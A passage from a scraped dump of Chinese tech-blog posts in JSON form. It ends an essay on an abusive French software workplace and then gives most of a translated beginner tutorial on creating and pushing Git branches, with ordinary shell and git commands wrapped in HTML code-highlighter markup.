点整以后到的所有员工都当场炒鱿鱼，包括一些经理和销售人员。</li>\n<li>抽烟的员工，因为跑出去抽烟，工作的时间就打了折扣。所以管理层决定让所有员工都不许吸烟。当然，没有用。</li>\n<li>有时候，一连好几天咖啡机都被收起来。因为跑去喝咖啡的人自然没有坐在办公桌前的人、伏案写代码的人工作时间长。</li>\n<li>每次有上级来视察，咖啡机就要关掉，以便给上级留下大家都在桌前认真写代码的印象。</li>\n<li>那里的洗手间是我去过的洗手间里最恶心的。大概也是为了提高大家的效率：上厕所的时间少了，工作的时间自然就多了（工作质量自然也上去了）。</li>\n</ul>\n<p>这样的工作，这样的管理，为什么大家还要来上班？最主要的原因就是当时法国深陷经济危机（某种程度上，现在也是），有工作，有薪水几乎成了特权，工作环境、内容自然就没那么在意了。</p>\n<p>还有一个原因，对于在那里的大多数员工而言，这份合约算是他们与一家真实公司签下的一份实实在在的合约。没有对比，就没有伤害，他们可能都不知道这份工作的糟心程度。很多员工新入职场，觉得迟到就被炒鱿鱼，也没什么不合理的。但是，这样严苛的标准，晚一分钟都不行，只有变态的管理者才会付诸现实。</p>\n<p>话又说回来，政府怎么会让这样的事情发生呢？但我们都心知肚明，政府里管这个项目预算的官员和软件公司的顶层管理人员拜过把子，关系够铁。在法国，这种程度的腐败也没什么新鲜的。很多人根本不知道，更别说有什么惩罚或者后果了。当然，也不限于法国，放眼欧美，这样的故事也不少。</p>\n<p>所以，下次上班觉得难熬，要学会置身处地。想像一下自己在那里工作，会是什么光景。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113920\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113920votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113920\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,项目", "url": "http://blog.jobbole.com/113920/", "url_obj_id": "b51b2aa44b0b3a7401e270a76cf4f1bf"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/b84f8d56e47a8496314a55a39b08ad10.jpg"], "title": "Git 分支操作介绍", "create_date": "2018/06/10 ·", "praise_num": 1, "fav_num": 3, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/5/git-branching\">Kedar Vijay Kulkarni</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9724-1.html\">Linux中国/Andy Song</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/06/b84f8d56e47a8496314a55a39b08ad10.jpg\"></p>\n<p>在本系列的前两篇文章中，我们<a href=\"http://blog.jobbole.com/114101/\">开始使用 Git</a>，学会如何<a href=\"http://blog.jobbole.com/114104/\">克隆项目，修改、增加和删除内容</a>。在这第三篇文章中，我将介绍 Git 分支，为何以及如何使用分支。</p>\n<p><img class=\"aligncenter\" title=\"tree branches\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/33aa33f3f7c1b6dab4b586b93923469a.jpg\" alt=\"树枝\"></p>\n<p>不妨用树来描绘 Git 仓库。图中的树有很多分支，或长或短，或从树干延伸或从其它分支延伸。在这里，我们用树干比作仓库的 master 分支，其中 <code>master</code> 代指 ”master 分支”，是 Git 仓库的中心分支或第一个分支。为简单起见，我们假设 <code>master</code> 是树干，其它分支都是从该分支分出的。</p>\n<h3 id=\"toc_1\">为何在 Git 仓库中使用分支</h3>\n<p>使用分支的主要理由为：</p>\n<ul>\n<li>如果你希望为项目增加新特性，但很可能会影响当前可正常工作的代码。对于该项目的活跃用户而言，这是很糟糕的事情。与其将特性加入到其它人正在使用的 <code>master</code> 分支，更好的方法是在仓库的其它分支中变更代码，下面会给出具体的工作方式。</li>\n<li>更重要的是，<a href=\"https://en.wikipedia.org/wiki/Git\">Git 其设计</a>用于协作。如果所有人都在你代码仓库的 <code>master</code> 分支上操作，会引发很多混乱。对编程语言或项目的知识和阅历因人而异；有些人可能会编写有错误或缺陷的代码，也可能会编写你觉得不适合该项目的代码。使用分支可以让你核验他人的贡献并选择适合的加入到项目中。（这里假设你是代码库唯一的所有者，希望对增加到项目中的代码有完全的控制。在真实的项目中，代码库有多个具有合并代码权限的所有者）</li>\n</ul>\n<h3 id=\"toc_2\">创建分支</h3>\n<p>让我们回顾<a href=\"http://blog.jobbole.com/114104/\">本系列上一篇文章</a>，看一下在我们的 Demo 目录中分支是怎样的。如果你没有完成上述操作，请按照文章中的指示从 GitHub 克隆代码并进入 Demo 目录。运行如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee2785308537392\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npwd\r\ngit branch\r\nls -la\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee2785308537392-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee2785308537392-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee2785308537392-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee2785308537392-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee2785308537392-1\"><span class=\"crayon-e\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee2785308537392-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">branch</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee2785308537392-3\"><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">la</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee2785308537392-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><code>pwd</code> 命令（是当前工作目录的英文缩写）返回当前你所处的目录（以便确认你在 <code>Demo</code> 目录中），<code>git branch</code> 列出该项目在你主机上的全部分支，<code>ls -la</code> 列出当前目录下的所有文件。你的终端输出类似于：</p>\n<p><img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/50e63bfafb866781b469c1a77a4f93a7.png\" alt=\"终端输出\"></p>\n<p>在 <code>master</code> 分支中，只有一个文件 <code>README.md</code>。（Git 会友好地忽略掉其它目录和文件。）</p>\n<p>接下来，运行如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee2791457401733\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit status\r\ngit checkout -b myBranch\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee2791457401733-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee2791457401733-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee2791457401733-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee2791457401733-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee2791457401733-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">status</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee2791457401733-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">checkout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">myBranch</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee2791457401733-3\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee2791457401733-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>第一条命令 <code>git status</code> 告知你当前位于 <code>branch master</code>，（就像在终端中看到的那样）它与 <code>origin/master</code> 处于同步状态，这意味着 master 分支的本地副本中的全部文件也出现在 GitHub 中。两份副本没有差异，所有的提交也是一致的。</p>\n<p>下一条命令 <code>git checkout -b myBranch</code> 中的 <code>-b</code> 告知 Git 创建一个名为 <code>myBranch</code> 的新分支，然后 <code>checkout</code> 命令将我们切换到新创建的分支。运行第三条命令 <code>git status</code> 确保你已经位于刚创建的分支下。</p>\n<p>如你所见，<code>git status</code> 告知你当前处于 <code>myBranch</code> 分支，没有变更需要提交。这是因为我们既没有增加新文件，也没有修改已有文件。</p>\n<p><img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/bf0f4c89a9667eb09fb29956b9cc9d56.png\" alt=\"终端输出\"></p>\n<p>如果希望以可视化的方式查看分支，可以运行 <code>gitk</code> 命令。如果遇到报错 <code>bash: gitk: command not found...</code>，请先安装 <code>gitk</code> 软件包（找到你操作系统对应的安装文档，以获得安装方式）。</p>\n<p>（LCTT 译注：需要在有 X 服务器的终端运行 <code>gitk</code>，否则会报错）</p>\n<p>下图展示了我们在 Demo 项目中的所作所为：你最后一次提交（的对应信息）是 <code>Delete file.txt</code>，在此之前有三次提交。当前的提交用黄点标注，之前的提交用蓝点标注，黄点和 <code>Delete file.txt</code> 之间的三个方块展示每个分支所在的位置（或者说每个分支中的最后一次提交的位置）。由于 <code>myBranch</code> 刚创建，提交状态与 <code>master</code> 分支及其对应的记为 <code>remotes/origin/master</code> 的远程 <code>master</code> 分支保持一致。（非常感谢来自 Red Hat 的 <a href=\"https://opensource.com/users/psav\">Peter Savage</a> 让我知道 <code>gitk</code> 这个工具）</p>\n<p><img class=\"aligncenter\" title=\"Gitk output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/4d766fc6104150cd915e1348c4ca080c.png\" alt=\"Gitk 输出\"></p>\n<p>下面让我们在 <code>myBranch</code> 分支下创建一个新文件并观察终端输出。运行如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee2797131266686\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\necho \"Creating a newFile on myBranch\" &gt; newFile\r\ncat newFile\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee2797131266686-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee2797131266686-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee2797131266686-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee2797131266686-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee2797131266686-1\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Creating a newFile on myBranch\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">newFile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee2797131266686-2\"><span class=\"crayon-e\">cat </span><span class=\"crayon-e\">newFile</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee2797131266686-3\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee2797131266686-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>第一条命令中的 <code>echo</code> 创建了名为 <code>newFile</code> 的文件，接着 <code>cat newFile</code> 打印出文件内容，最后 <code>git status</code> 告知你我们 <code>myBranch</code> 分支的当前状态。在下面的终端输出中，Git 告知 <code>myBranch</code> 分支下有一个名为 <code>newFile</code> 的文件当前处于 <code>untracked</code> 状态。这表明我们没有让 Git 追踪发生在文件 <code>newFile</code> 上的变更。</p>\n<p><img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/9940ad61d955b4a2cfbeb264b8844f73.png\" alt=\"终端输出\"></p>\n<p>下一步是增加文件，提交变更并将 <code>newFile</code> 文件推送至 <code>myBranch</code> 分支（请回顾本系列上一篇文章获得更多细节）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee279d352357182\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit add newFile\r\ngit commit -m \"Adding newFile to myBranch\"\r\ngit push origin myBranch\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee279d352357182-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee279d352357182-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee279d352357182-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee279d352357182-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee279d352357182-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">newFile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee279d352357182-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Adding newFile to myBranch\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee279d352357182-3\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">push </span><span class=\"crayon-e\">origin </span><span class=\"crayon-i\">myBranch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee279d352357182-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0035 seconds] -->\r\n<p>在上述命令中，<code>push</code> 命令使用的分支参数为 <code>myBranch</code> 而不是 <code>master</code>。Git 添加 <code>newFile</code> 并将变更推送到你 GitHub 账号下的 Demo 仓库中，告知你在 GitHub 上创建了一个与你本地副本分支 <code>myBranch</code> 一样的新分支。终端输出截图给出了运行命令的细节及命令输出。</p>\n<p><img class=\"aligncenter\" title=\"Terminal output\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/4f3bcd2a38a341027ce084f1ed51bfa4.png\" alt=\"终端输出\"></p>\n<p>当你访问 GitHub 时，在分支选择的下拉列表中可以发现两个可供选择的分支。</p>\n<p><img class=\"aligncenter\" title=\"GitHub\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/29592bacfeab5a8a161ca2f1b837c350.png\" alt=\"GitHub\"></p>\n<p>点击 <code>myBranch</code> 切换到 <code>myBranch</code> 分支，你可以看到在此分支上新增的文件。</p>\n<p><img class=\"aligncenter\" title=\"GitHub\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/eb928ec5ffe78a74df84b376c33b30a8.png\" alt=\"GitHub\"></p>\n<p>截至目前，我们有两个分支：一个是 <code>master</code> 分支，只有一个 <code>README.md</code> 文件；另一个是 <code>myBranch</code> 分支，有两个文件。</p>\n<p>你已经知道如何创建分支了，下面我们再创建一个分支。输入如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee27a2968007560\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit checkout master\r\ngit checkout -b myBranch2\r\ntouch newFile2\r\ngit add newFile2\r\ngit commit -m \"Adding newFile2 to myBranch2\"\r\ngit push origin myBranch2\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee27a2968007560-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee27a2968007560-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee27a2968007560-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee27a2968007560-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee27a2968007560-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee27a2968007560-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee27a2968007560-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee27a2968007560-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">checkout </span><span class=\"crayon-e\">master</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee27a2968007560-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">checkout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">myBranch2</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee27a2968007560-3\"><span class=\"crayon-e\">touch </span><span class=\"crayon-e\">newFile2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee27a2968007560-4\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">newFile2</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee27a2968007560-5\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Adding newFile2 to myBranch2\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee27a2968007560-6\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">push </span><span class=\"crayon-e\">origin </span><span class=\"crayon-i\">myBranch2</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee27a2968007560-7\"> 